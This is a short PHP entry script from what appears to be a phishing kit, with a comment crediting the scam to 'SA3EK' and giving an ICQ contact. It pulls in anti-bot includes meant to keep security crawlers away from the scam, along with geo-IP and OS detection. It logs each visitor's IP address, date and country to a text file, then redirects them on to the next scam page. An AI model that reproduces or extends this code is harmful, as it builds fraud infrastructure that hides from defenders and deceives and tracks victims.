<?php
	error_reporting(E_ERROR | E_PARSE);
	include('verify/antibots/bot.php');
    include('verify/antibots/checkbots.php');
	include('verify/antibots/perfect.php');
	include('verify/geoip/get_ip.php');
	include('verify/geoip/get_os.php');
	include('verify/geoip/session_lg.php');
	$YSDIR = fopen("VISITORS.txt","a");
	fwrite($YSDIR, $ipaddress . " | VISITED | " . $DATE . " | " . $country . "\n");
	header('Location: to.php');
	/******
    SCAM BY SA3EK
    ICQ : 740900705
    *******/
?>